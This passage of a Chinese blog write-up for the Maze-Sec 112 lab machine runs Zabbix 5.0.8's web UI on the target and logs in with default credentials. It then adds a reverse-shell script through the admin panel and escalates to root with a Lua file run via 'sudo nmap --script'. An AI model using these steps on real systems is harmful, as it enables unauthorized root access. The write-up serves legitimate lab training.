</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>导入后，重启靶机，观察 zabbix 服务状态</p> <p><img src="/medias/maze-112/13.png" alt=""></p> <p>部署一个 zabbix web 前端页面，可以通过默认的用户名密码 <code>Admin:zabbix</code> 登录进入后台添加反弹shell命令</p> <p>Google 找到 zabbix 5.0.8 版本的源码包</p> <p><img src="/medias/maze-112/14.png" alt=""></p> <p><a href="https://cdn.zabbix.com/zabbix/sources/oldstable/5.0/zabbix-5.0.8.tar.gz" target="_blank" rel="noopener noreferrer">https://cdn.zabbix.com/zabbix/sources/oldstable/5.0/zabbix-5.0.8.tar.gz<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <p>下载源码包到靶机 /tmp 目录，解压后进入 web ui 目录</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token builtin class-name">cd</span> /tmp
<span class="token function">wget</span> https://cdn.zabbix.com/zabbix/sources/oldstable/5.0/zabbix-5.0.8.tar.gz
<span class="token function">tar</span> <span class="token parameter variable">-xvf</span> zabbix-5.0.8.tar.gz
<span class="token builtin class-name">cd</span> zabbix-5.0.8/ui/
php <span class="token parameter variable">-S</span> <span class="token number">0.0</span>.0.0:8000
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>访问靶机 8000 端口，进入 zabbix 部署页面，检查环境依赖遇到很多问题，有些要求php.ini配置修改，有些要求php模块安装</p> <p><img src="/medias/maze-112/16.png" alt=""></p> <p>再次启动，缺少 php-bcmath 模块</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>/tmp/php <span class="token parameter variable">-S</span> <span class="token number">0.0</span>.0.0:8000 <span class="token parameter variable">-d</span> <span class="token assign-left variable">post_max_size</span><span class="token operator">=</span>16M <span class="token parameter variable">-d</span> <span class="token assign-left variable">max_execution_time</span><span class="token operator">=</span><span class="token number">300</span> <span class="token parameter variable">-d</span> <span class="token assign-left variable">max_input_time</span><span class="token operator">=</span><span class="token number">300</span> <span class="token parameter variable">-d</span> <span class="token assign-left variable">memory_limit</span><span class="token operator">=</span>128M <span class="token parameter variable">-d</span> <span class="token assign-left variable">extension</span><span class="token operator">=</span>bcmath <span class="token parameter variable">-d</span> <span class="token assign-left variable">extension</span><span class="token operator">=</span>gd <span class="token parameter variable">-d</span> <span class="token assign-left variable">extension</span><span class="token operator">=</span>mbstring <span class="token parameter variable">-d</span> <span class="token assign-left variable">extension</span><span class="token operator">=</span>xmlreader <span class="token parameter variable">-d</span> <span class="token assign-left variable">extension</span><span class="token operator">=</span>xmlwriter
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/medias/maze-112/17.png" alt=""></p> <h3 id="_2-2、静态编译-php-cli-解决依赖问题"><a href="#_2-2、静态编译-php-cli-解决依赖问题" class="header-anchor">#</a> 2.2、静态编译 php-cli 解决依赖问题</h3> <p>发现个好玩的Github项目 <code>static-php-cli</code>，可以很好地解决这个问题 <a href="https://github.com/crazywhalecc/static-php-cli" target="_blank" rel="noopener noreferrer">https://github.com/crazywhalecc/static-php-cli<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <p>可以自己编译一个静态编译的 php-cli，或者直接下载别人编译好的版本</p> <p><img src="/medias/maze-112/18.png" alt=""></p> <p>这里提供了已经编译好的静态php文件</p> <p>https://dl.static-php.dev/static-php-cli/bulk/</p> <p><img src="/medias/maze-112/19.png" alt=""></p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token function">wget</span> https://dl.static-php.dev/static-php-cli/bulk/php-8.0.30-cli-linux-x86_64.tar.gz
<span class="token function">tar</span> <span class="token parameter variable">-xvf</span> php-8.0.30-cli-linux-x86_64.tar.gz
./php <span class="token parameter variable">-m</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>已经有了 bcmath 模块，把这个静态编译的 php-cli 上传到靶机，使用这个 php-cli 启动 zabbix web ui</p> <p><img src="/medias/maze-112/20.png" alt=""></p> <p>在 cli 启动时，直接指定 php.ini 配置参数，解决之前遇到的各种对 php.ini 的配置问题</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>/tmp/php <span class="token parameter variable">-S</span> <span class="token number">0.0</span>.0.0:8000 <span class="token punctuation">\</span>
<span class="token parameter variable">-d</span> <span class="token assign-left variable">date.timezone</span><span class="token operator">=</span>Asia/Shanghai <span class="token punctuation">\</span>
<span class="token parameter variable">-d</span> <span class="token assign-left variable">post_max_size</span><span class="token operator">=</span>16M <span class="token punctuation">\</span>
<span class="token parameter variable">-d</span> <span class="token assign-left variable">max_execution_time</span><span class="token operator">=</span><span class="token number">300</span> <span class="token punctuation">\</span>
<span class="token parameter variable">-d</span> <span class="token assign-left variable">max_input_time</span><span class="token operator">=</span><span class="token number">300</span> <span class="token punctuation">\</span>
<span class="token parameter variable">-d</span> <span class="token assign-left variable">display_errors</span><span class="token operator">=</span>Off <span class="token punctuation">\</span>
<span class="token parameter variable">-t</span> /tmp/zabbix-5.0.8/ui
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>正常部署</p> <p><img src="/medias/maze-112/21.png" alt=""></p> <p>在官网可以拿到默认用户名密码<a href="https://www.zabbix.com/documentation/7.0/zh/manual/quickstart/login" target="_blank" rel="noopener noreferrer">https://www.zabbix.com/documentation/7.0/zh/manual/quickstart/login<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <p><img src="/medias/maze-112/23.png" alt=""></p> <p><img src="/medias/maze-112/22.png" alt=""></p> <h3 id="_2-3、zabbix-提权"><a href="#_2-3、zabbix-提权" class="header-anchor">#</a> 2.3、zabbix 提权</h3> <p>在 zabbix 后台添加一个 反弹 shell 脚本</p> <p><img src="/medias/maze-112/24.png" alt=""></p> <p><img src="/medias/maze-112/25.png" alt=""></p> <p>在主机监控处触发反弹shell脚本</p> <p><img src="/medias/maze-112/26.png" alt=""></p> <p><img src="/medias/maze-112/27.png" alt=""></p> <p>zabbix 用户可以 sudo 执行 nmap -O 参数，-O: Enable OS detection 用来启用操作系统探测功能，后面通配符部分可以随意发挥</p> <p>Gtfobins 找 nmap 提权，nmap可以执行lua脚本，利用 lua 脚本执行任意命令</p> <p><img src="/medias/maze-112/28.png" alt=""></p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token builtin class-name">echo</span> <span class="token string">'os.execute(&quot;/bin/bash -p&quot;)'</span> <span class="token operator">&gt;</span> /tmp/exp.lua
<span class="token function">sudo</span> nmap <span class="token parameter variable">-O</span> <span class="token number">127.0</span>.0.1 <span class="token parameter variable">--script</span><span class="token operator">=</span>/tmp/exp.lua
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p><img src="/medias/maze-112/29.png" alt=""></p></div></div>  <div class="page-edit"><div class="edit-link"><a href="https://github.com/Apursuit/Apursuit.github.io/edit/master/docs/12.渗透/46.mazesec-112.md" target="_blank" rel="noopener noreferrer">编辑</a> <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></div> <!----> <div class="last-updated"><span class="prefix">最后一次更新于:</span> <span class="time">2026/01/17, 14:37:55</span></div></div> <div class="page-nav-wapper"><div class="page-nav-centre-wrap"><a href="/pages/maze-sec-111/" class="page-nav-centre page-nav-centre-prev"><div class="tooltip">Maze-Sec 111</div></a> <!----></div> <div class="page-nav"><p class="inner"><span class="prev">
        ←
        <a href="/pages/maze-sec-111/" class="prev">Maze-Sec 111</a></span> <!----></p></div></div></div> <!----></main></div> <div class="footer"><div class="icons"><a href="mailto:admin@gmail.com" title="发邮件" target="_blank" class="iconfont icon-youjian"></a><a href="https://github.com/Apursuit" title="GitHub" target="_blank" class="iconfont icon-github"></a></div> 
  Theme by
  <a href="https://github.com/xugaoyi/vuepress-theme-vdoing" target="_blank" title="本站主题">Vdoing</a> 
    | Copyright © 2024-2026
    <span></span></div> <div class="buttons"><div title="返回顶部" class="button blur go-to-top iconfont icon-fanhuidingbu" style="display:none;"></div> <div title="去评论" class="button blur go-to-comment iconfont icon-pinglun" style="display:none;"></div> <div title="主题模式" class="button blur theme-mode-but iconfont icon-zhuti"><ul class="select-box" style="display:none;"><li class="iconfont icon-zidong">
          跟随系统
        </li><li class="iconfont icon-rijianmoshi">
          浅色模式
        </li><li class="iconfont icon-yejianmoshi">
          深色模式
        </li><li class="iconfont icon-yuedu">
          阅读模式
        </li></ul></div></div> <!----> <!----> <!----></div><div class="global-ui"><div></div></div></div>
    <script src="/assets/js/app.dd92e586.js" defer></script><script src="/assets/js/2.1b31a38c.js" defer></script><script src="/assets/js/165.bdea775a.js" defer></script>
  </body>
</html>
